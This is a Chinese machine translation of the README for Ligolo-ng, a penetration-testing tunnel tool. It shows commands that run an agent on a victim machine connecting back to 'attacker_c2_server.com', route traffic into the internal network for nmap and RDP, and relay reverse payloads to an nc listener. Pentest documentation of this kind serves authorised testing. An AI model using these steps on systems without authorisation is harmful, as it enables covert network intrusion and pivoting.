# Ligolo-ng ：像 VPN 一样建立隧道



[![利戈洛标志](https://github.com/nicocha30/ligolo-ng/raw/master/doc/logo.png)](https://github.com/nicocha30/ligolo-ng/blob/master/doc/logo.png)

一种使用 TUN 接口的高级但简单的隧道工具。

[![GPLv3](https://camo.githubusercontent.com/3a7dab0df64e2758b8984024a5a118e0220141563c595e9c3b5cd849f9d6160d/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d47504c76332d627269676874677265656e2e737667)](https://www.gnu.org/licenses/gpl-3.0) [![去报告](https://camo.githubusercontent.com/e8425c01b6b4e37268e78119e368bd32fa40816ba5213861c64eee76c5f4b5f9/68747470733a2f2f676f7265706f7274636172642e636f6d2f62616467652f6769746875622e636f6d2f6e69636f63686133302f6c69676f6c6f2d6e67)](https://goreportcard.com/report/github.com/nicocha30/ligolo-ng) [![GitHub 赞助商](https://camo.githubusercontent.com/14407921995c17a6183354c36992c31245cc6ce03effbfaa507c0e5e1e0516ed/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73706f6e736f72732f6e69636f6368613330)](https://github.com/sponsors/nicocha30)

您使用 Ligolo-ng 进行渗透测试吗？它对您通过认证有帮助吗？请考虑赞助该项目，以便我可以给我的团队买一些饮料。 ☕

[❤️ 赞助nicocha30](https://github.com/sponsors/nicocha30)

## 目录



- [介绍](https://github.com/nicocha30/ligolo-ng#introduction)
- [特征](https://github.com/nicocha30/ligolo-ng#features)
- [这与 Ligolo/Chisel/Meterpreter... 有什么不同？](https://github.com/nicocha30/ligolo-ng#how-is-this-different-from-ligolochiselmeterpreter-)
- 建造与使用
  - [预编译的二进制文件](https://github.com/nicocha30/ligolo-ng#precompiled-binaries)
  - [建设利戈隆](https://github.com/nicocha30/ligolo-ng#building-ligolo-ng)
  - 安装程序
    - [Linux](https://github.com/nicocha30/ligolo-ng#linux)
    - [视窗](https://github.com/nicocha30/ligolo-ng#windows)
    - [运行 Ligolo-ng 代理服务器](https://github.com/nicocha30/ligolo-ng#running-ligolo-ng-proxy-server)
  - TLS 选项
    - [使用 Let's Encrypt Autocert](https://github.com/nicocha30/ligolo-ng#using-lets-encrypt-autocert)
    - [使用您自己的 TLS 证书](https://github.com/nicocha30/ligolo-ng#using-your-own-tls-certificates)
    - [自动自签名证书（不推荐）](https://github.com/nicocha30/ligolo-ng#automatic-self-signed-certificates-not-recommended)
  - [使用 Ligolo-ng](https://github.com/nicocha30/ligolo-ng#using-ligolo-ng)
  - [代理绑定/监听](https://github.com/nicocha30/ligolo-ng#agent-bindinglistening)
  - [访问代理的本地端口（127.0.0.1）](https://github.com/nicocha30/ligolo-ng#access-to-agents-local-ports-127001)
- [演示](https://github.com/nicocha30/ligolo-ng#demo)
- [是否需要管理员/root 访问权限？](https://github.com/nicocha30/ligolo-ng#does-it-require-administratorroot-access-)
- [支持的协议/数据包](https://github.com/nicocha30/ligolo-ng#supported-protocolspackets)
- [表现](https://github.com/nicocha30/ligolo-ng#performance)
- [注意事项](https://github.com/nicocha30/ligolo-ng#caveats)
- [去做](https://github.com/nicocha30/ligolo-ng#todo)
- [制作人员](https://github.com/nicocha30/ligolo-ng#credits)

## 介绍

**Ligolo-ng**是一个*简单*、*轻量级*且*快速的工具，允许渗透测试人员使用***tun 接口**（无需 SOCKS）从反向 TCP/TLS 连接建立隧道。

## 特征

- **Tun 接口**（不再有 SOCKS！）
- *带有代理*选择和*网络信息*的简单 UI
- 易于使用和设置
- 使用 Let's Encrypt 自动配置证书
- 高性能（多路复用）
- 不需要高权限
- *代理*上的套接字侦听/绑定
- *代理*支持多个平台
- 可以处理多个隧道

## 这与 Ligolo/Chisel/Meterpreter... 有什么不同？

**Ligolo-ng使用**[Gvisor](https://gvisor.dev/)创建用户层网络堆栈，而不是使用 SOCKS 代理或 TCP/UDP 转发器。

运行*中继/代理*服务器时，会使用**tun**接口，发送到该接口的数据包将被转换，然后传输到*代理*远程网络。

例如，对于 TCP 连接：

- SYN 被转换为远程的 connect()
- 如果 connect() 成功，则发送回 SYN-ACK
- 如果连接后返回 ECONNRESET、ECONNABORTED 或 ECONNREFUSED 系统调用，则发送 RST
- 如果超时则不会发送任何内容

这允许在不使用*代理链*的情况下运行*nmap*等工具（更简单、更快）。

## 建造与使用

### 预编译的二进制文件

[预编译的二进制文件 (Windows/Linux/macOS) 可在发布页面](https://github.com/nicocha30/ligolo-ng/releases)上找到。

### 建设利戈隆

构建*ligolo-ng*（需要 Go >= 1.20）：

```
$ go build -o agent cmd/agent/main.go
$ go build -o proxy cmd/proxy/main.go
# Build for Windows
$ GOOS=windows go build -o agent.exe cmd/agent/main.go
$ GOOS=windows go build -o proxy.exe cmd/proxy/main.go
```

### 安装程序

#### Linux

使用Linux时，需要在代理服务器（C2）上创建tun接口：

```
$ sudo ip tuntap add user [your_username] mode tun ligolo
$ sudo ip link set ligolo up
```

删除上述网络接口设置：

```c
# 关闭并删除ligolo接口
sudo ip link set ligolo down
sudo ip tuntap del mode tun ligolo
```

#### 视窗

您需要下载[Wintun驱动程序（由](https://www.wintun.net/)[WireGuard](https://www.wireguard.com/)使用）并将其放置`wintun.dll`在与 Ligolo 相同的文件夹中（确保您使用正确的架构）。

#### 运行 Ligolo-ng 代理服务器

在命令和控制 (C2) 服务器上启动*代理服务器（默认端口 11601）：*

```
$ ./proxy -h # Help options
$ ./proxy -autocert # Automatically request LetsEncrypt certificates
```

### TLS 选项

#### 使用 Let's Encrypt Autocert

使用该选项时，当代理连接时，代理将自动为*attacker_c2_server.com*`-autocert`请求证书（使用Let's Encrypt） 。

> 需要可访问端口 80 才能进行 Let's Encrypt 证书验证/检索

#### 使用您自己的 TLS 证书

如果您想为代理服务器使用自己的证书，可以使用`-certfile`和`-keyfile`参数。

#### 自动自签名证书（不推荐）

代理*/中继*可以使用该选项自动生成自签名 TLS 证书`-selfcert`。

该选项需要与*代理*`-ignore-cert`一起使用。

> 谨防中间人攻击！此选项只能在测试环境中使用或用于调试目的。

### 使用 Ligolo-ng

在目标（受害者）计算机上启动*代理*（不需要任何权限！）：

```
$ ./agent -connect attacker_c2_server.com:11601
```

> 如果您想通过 SOCKS5 代理建立隧道连接，可以使用该`--socks ip:port`选项。您可以使用`--socks-user`和`--socks-pass`参数指定 SOCKS 凭据。

*代理*服务器上应出现会话。

```
INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"
```

使用`session`命令选择*代理*。

```
ligolo-ng » session 
? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
```

使用以下命令显示代理的网络配置`ifconfig`：

```
[Agent : nchatelain@nworkstation] » ifconfig 
[...]
┌─────────────────────────────────────────────┐
│ Interface 3                                 │
├──────────────┬──────────────────────────────┤
│ Name         │ wlp3s0                       │
│ Hardware MAC │ de:ad:be:ef:ca:fe            │
│ MTU          │ 1500                         │
│ Flags        │ up|broadcast|multicast       │
│ IPv4 Address │ 192.168.0.30/24             │
└──────────────┴──────────────────────────────┘
```

*在代理/中继*服务器上添加到*192.168.0.0/24* *代理*网络的路由。

*Linux*：

```
$ sudo ip route add 192.168.0.0/24 dev ligolo
```

*窗户*：

```
> netsh int ipv4 show interfaces

Idx     Mét         MTU          État                Nom
---  ----------  ----------  ------------  ---------------------------
 25           5       65535  connected     ligolo
   
> route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]
```

在代理上启动隧道：

```
[Agent : nchatelain@nworkstation] » start_tunnel
[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   
```

您还可以使用以下选项指定自定义 tuntap 接口`--tun iface`：

```
[Agent : nchatelain@nworkstation] » start_tunnel --tun mycustomtuntap
[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   
```

您现在可以从*代理*服务器访问*192.168.0.0/24* *代理*网络。

```
$ nmap 192.168.0.0/24 -v -sV -n
[...]
$ rdesktop 192.168.0.123
[...]
```

### 代理绑定/监听

您可以侦听*代理*上的端口并将连接*重定向*到您的控制/代理服务器。

在 ligolo 会话中，使用该`listener_add`命令。

以下示例将在代理 (0.0.0.0:1234) 上创建 TCP 侦听套接字，并将连接重定向到代理服务器的 4321 端口。

```
[Agent : nchatelain@nworkstation] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
INFO[1208] Listener created on remote agent!            
```

关于`proxy`：

```
$ nc -lvp 4321
```

`1234`当在代理的TCP 端口上建立连接时，`nc`将接收该连接。

当使用反向 tcp/udp 有效负载时，这非常有用。

您可以使用以下命令查看当前正在运行的侦听器`listener_list`并使用以下`listener_stop [ID]`命令停止它们：

```
[Agent : nchatelain@nworkstation] » listener_list 
┌───────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                              │
├───┬─────────────────────────┬────────────────────────┬────────────────────────┤
│ # │ AGENT                   │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
├───┼─────────────────────────┼────────────────────────┼────────────────────────┤
│ 0 │ nchatelain@nworkstation │ 0.0.0.0:1234           │ 127.0.0.1:4321         │
└───┴─────────────────────────┴────────────────────────┴────────────────────────┘

[Agent : nchatelain@nworkstation] » listener_stop 0
INFO[1505] Listener closed.                             
```

### 访问代理的本地端口（127.0.0.1）

如果您需要访问当前连接的代理的本地端口，Ligolo-ng 中有一个硬编码的“神奇”IP：*240.0.0.1*（此 IP 地址是未使用的 IPv4 子网的一部分）。如果您查询此 IP 地址，Ligolo-ng 会自动将流量重定向到代理的本地 IP 地址 (127.0.0.1)。

例子：

```
$ sudo ip route add 240.0.0.1/32 dev ligolo
$ nmap 240.0.0.1 -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-30 22:17 CET
Nmap scan report for 240.0.0.1
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
8000/tcp open http SimpleHTTPServer 0.6 (Python 3.9.2)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.16 seconds
```

## 演示

<details open="" class="details-reset border rounded-2" style="box-sizing: border-box; display: block; border: var(--borderWidth-thin, 1px) solid var(--borderColor-default, var(--color-border-default)) !important; border-radius: var(--borderRadius-medium, 6px) !important; margin-top: 0px; margin-bottom: 16px; color: rgb(31, 35, 40); font-family: -apple-system, &quot;system-ui&quot;, &quot;Segoe UI&quot;, &quot;Noto Sans&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><summary class="px-3 py-2" style="box-sizing: border-box; display: list-item; cursor: pointer; padding-top: var(--base-size-8, 8px) !important; padding-bottom: var(--base-size-8, 8px) !important; padding-right: var(--base-size-16, 16px) !important; padding-left: var(--base-size-16, 16px) !important; list-style: none; transition: color 80ms cubic-bezier(0.33, 1, 0.68, 1) 0s, background-color, box-shadow, border-color;"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-device-camera-video"><path d="M16 3.75v8.5a.75.75 0 0 1-1.136.643L11 10.575v.675A1.75 1.75 0 0 1 9.25 13h-7.5A1.75 1.75 0 0 1 0 11.25v-6.5C0 3.784.784 3 1.75 3h7.5c.966 0 1.75.784 1.75 1.75v.675l3.864-2.318A.75.75 0 0 1 16 3.75Zm-6.5 1a.25.25 0 0 0-.25-.25h-7.5a.25.25 0 0 0-.25.25v6.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-6.5ZM11 8.825l3.5 2.1v-5.85l-3.5 2.1Z"></path></svg><span>&nbsp;</span><span aria-label="视频描述 ligolo-ng_demo.mp4" class="m-1" style="box-sizing: border-box; margin: var(--base-size-4, 4px) !important;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">ligolo-ng_demo.mp4</font></font></span><span>&nbsp;</span><span class="dropdown-caret" style="box-sizing: border-box; border-bottom-color: rgba(0, 0, 0, 0); border-left-color: rgba(0, 0, 0, 0); border-right-color: rgba(0, 0, 0, 0); border-style: solid; border-width: var(--borderWidth-thicker, max(4px, 0.25rem)) var(--borderWidth-thicker, max(4px, 0.25rem)) 0; content: &quot;&quot;; display: inline-block; height: 0px; vertical-align: middle; width: 0px;"></span></summary><video src="https://private-user-images.githubusercontent.com/31402213/127328691-e063e3f2-dbd9-43c6-bd12-08065a6d260f.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE2NzU1NDQsIm5iZiI6MTcxMTY3NTI0NCwicGF0aCI6Ii8zMTQwMjIxMy8xMjczMjg2OTEtZTA2M2UzZjItZGJkOS00M2M2LWJkMTItMDgwNjVhNmQyNjBmLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjklMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzI5VDAxMjA0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ0NzYyYjI1NGM5OGE5ZGNjODY4M2Y0MGM4OGI3ODE3Mzg1ZTBlODI1MWZkOGNlZmM4Yzc3NjFhZTBiM2ExZTMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.rauseVBt5Twlu3dC131b1ph96wpmSgtHWqyQCPRuSs8" data-canonical-src="https://private-user-images.githubusercontent.com/31402213/127328691-e063e3f2-dbd9-43c6-bd12-08065a6d260f.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE2NzU1NDQsIm5iZiI6MTcxMTY3NTI0NCwicGF0aCI6Ii8zMTQwMjIxMy8xMjczMjg2OTEtZTA2M2UzZjItZGJkOS00M2M2LWJkMTItMDgwNjVhNmQyNjBmLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjklMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzI5VDAxMjA0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ0NzYyYjI1NGM5OGE5ZGNjODY4M2Y0MGM4OGI3ODE3Mzg1ZTBlODI1MWZkOGNlZmM4Yzc3NjFhZTBiM2ExZTMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.rauseVBt5Twlu3dC131b1ph96wpmSgtHWqyQCPRuSs8" controls="controls" muted="muted" class="d-block rounded-bottom-2 border-top width-fit" style="box-sizing: border-box; display: block !important; border-top: var(--borderWidth-thin, 1px) solid var(--borderColor-default, var(--color-border-default)) !important; border-bottom-right-radius: var(--borderRadius-medium, 6px) !important; border-bottom-left-radius: var(--borderRadius-medium, 6px) !important; max-width: 100%; max-height: 640px; min-height: 200px;"></video></details>

## 是否需要管理员/root 访问权限？

*代理*方面，不行！一切都可以在没有管理访问权限的情况下执行。

但是，在*中继/代理*服务器上，您需要能够创建*tun*接口。

## 支持的协议/数据包

- 传输控制协议
- UDP协议
- ICMP（回显请求）

## 表现

您可以轻松达到 100 Mbits/sec 以上。这是使用`iperf`200Mbits/s 服务器到 200Mbits/s 连接的测试。

```
$ iperf3 -c 10.10.0.1 -p 24483
Connecting to host 10.10.0.1, port 24483
[  5] local 10.10.0.224 port 50654 connected to 10.10.0.1 port 24483
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-1.00   sec  12.5 MBytes   105 Mbits/sec    0    164 KBytes       
[  5]   1.00-2.00   sec  12.7 MBytes   107 Mbits/sec    0    263 KBytes       
[  5]   2.00-3.00   sec  12.4 MBytes   104 Mbits/sec    0    263 KBytes       
[  5]   3.00-4.00   sec  12.7 MBytes   106 Mbits/sec    0    263 KBytes       
[  5]   4.00-5.00   sec  13.1 MBytes   110 Mbits/sec    2    134 KBytes       
[  5]   5.00-6.00   sec  13.4 MBytes   113 Mbits/sec    0    147 KBytes       
[  5]   6.00-7.00   sec  12.6 MBytes   105 Mbits/sec    0    158 KBytes       
[  5]   7.00-8.00   sec  12.1 MBytes   101 Mbits/sec    0    173 KBytes       
[  5]   8.00-9.00   sec  12.7 MBytes   106 Mbits/sec    0    182 KBytes       
[  5]   9.00-10.00  sec  12.6 MBytes   106 Mbits/sec    0    188 KBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.00  sec   127 MBytes   106 Mbits/sec    2             sender
[  5]   0.00-10.08  sec   125 MBytes   104 Mbits/sec                  receiver
```

## 注意事项

由于*代理*在没有特权的情况下运行，因此无法转发原始数据包。当您执行 NMAP SYN-SCAN 时，将在代理上执行 TCP connect()。

使用*nmap*时，应该使用`--unprivileged`或`-PE`来避免误报。

## 去做

- 实施其他 ICMP 错误消息（这将加快 UDP 扫描速度）；
- 当从无效的 TCP 连接收到*ACK*时不要*进行 RST*（nmap 将报告主机已启动）；
- 添加 mTLS 支持。

## 制作人员

- 尼古拉斯·查特兰 <nicolas -at- chatelain.me>